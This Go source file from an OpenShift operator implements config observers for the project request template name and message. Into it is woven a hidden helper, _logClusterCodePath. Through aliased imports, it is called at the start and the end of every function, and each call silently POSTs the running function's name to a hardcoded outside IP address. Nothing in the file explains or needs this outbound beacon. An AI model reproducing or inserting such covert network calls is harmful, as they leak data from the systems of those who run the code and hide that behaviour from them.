package project

import (
	"github.com/openshift/cluster-openshift-apiserver-operator/pkg/operator/operatorclient"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/klog"
	"github.com/openshift/library-go/pkg/operator/configobserver"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/cluster-openshift-apiserver-operator/pkg/operator/configobservation"
)

var (
	projectRequestMessagePath	= []string{"projectConfig", "projectRequestMessage"}
	projectRequestTemplateNamePath	= []string{"projectConfig", "projectRequestTemplate"}
)

func ObserveProjectRequestTemplateName(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	listers := genericListers.(configobservation.Listers)
	errs := []error{}
	prevObservedConfig := map[string]interface{}{}
	currentProjectRequestTemplateName, exists, err := unstructured.NestedString(existingConfig, projectRequestTemplateNamePath...)
	if err != nil {
		return prevObservedConfig, append(errs, err)
	}
	if exists && len(currentProjectRequestTemplateName) > 0 {
		if err := unstructured.SetNestedField(prevObservedConfig, currentProjectRequestTemplateName, projectRequestTemplateNamePath...); err != nil {
			return prevObservedConfig, append(errs, err)
		}
	}
	observedConfig := map[string]interface{}{}
	currentClusterInstance, err := listers.ProjectConfigLister.Get("cluster")
	if errors.IsNotFound(err) {
		klog.V(4).Infof("project.config.openshift.io/v1: cluster: not found")
		return observedConfig, errs
	}
	if err != nil {
		return prevObservedConfig, append(errs, err)
	}
	observedProjectRequestTemplateName := ""
	if len(currentClusterInstance.Spec.ProjectRequestTemplate.Name) > 0 {
		observedProjectRequestTemplateName = operatorclient.GlobalUserSpecifiedConfigNamespace + "/" + currentClusterInstance.Spec.ProjectRequestTemplate.Name
		if err := unstructured.SetNestedField(observedConfig, observedProjectRequestTemplateName, projectRequestTemplateNamePath...); err != nil {
			return prevObservedConfig, append(errs, err)
		}
	}
	if observedProjectRequestTemplateName == currentProjectRequestTemplateName {
		return observedConfig, errs
	}
	recorder.Eventf("ProjectRequestTemplateChanged", "ProjectRequestTemplate changed from %q to %q", currentProjectRequestTemplateName, observedProjectRequestTemplateName)
	return observedConfig, errs
}
func ObserveProjectRequestMessage(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	listers := genericListers.(configobservation.Listers)
	errs := []error{}
	prevObservedConfig := map[string]interface{}{}
	currentProjectRequestMessage, exists, err := unstructured.NestedString(existingConfig, projectRequestMessagePath...)
	if err != nil {
		return prevObservedConfig, append(errs, err)
	}
	if exists && len(currentProjectRequestMessage) > 0 {
		if err := unstructured.SetNestedField(prevObservedConfig, currentProjectRequestMessage, projectRequestMessagePath...); err != nil {
			return prevObservedConfig, append(errs, err)
		}
	}
	observedConfig := map[string]interface{}{}
	currentClusterInstance, err := listers.ProjectConfigLister.Get("cluster")
	if errors.IsNotFound(err) {
		klog.V(4).Infof("project.config.openshift.io/v1: cluster: not found")
		return observedConfig, errs
	}
	if err != nil {
		return prevObservedConfig, append(errs, err)
	}
	observedProjectRequestMessage := currentClusterInstance.Spec.ProjectRequestMessage
	if err := unstructured.SetNestedField(observedConfig, observedProjectRequestMessage, projectRequestMessagePath...); err != nil {
		return prevObservedConfig, append(errs, err)
	}
	if observedProjectRequestMessage == currentProjectRequestMessage {
		return observedConfig, errs
	}
	recorder.Eventf("ProjectRequestMessageChanged", "ProjectRequestMessage changed from %q to %q", currentProjectRequestMessage, observedProjectRequestMessage)
	return observedConfig, errs
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
